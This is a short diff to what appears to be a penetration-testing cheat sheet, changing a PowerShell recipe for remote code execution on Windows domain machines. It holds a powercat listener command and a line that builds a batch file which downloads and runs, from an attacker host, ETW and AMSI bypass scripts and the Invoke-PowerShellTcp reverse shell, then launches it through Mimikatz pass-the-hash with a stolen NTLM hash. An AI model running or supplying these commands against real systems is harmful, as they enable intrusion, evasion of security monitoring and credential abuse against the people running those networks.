@@ -153,7 +153,8 @@ powercat -l -v -p 444 -t 5000
 
 $sess = New-PSSession <SERVER> 
 #.ps1 is a reverse shell back to the attacker machine, make sure you run it as the user you want
-$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat
+$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/etw.txt'')); ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/amsi.txt'')); ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat
+
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
 ```
 
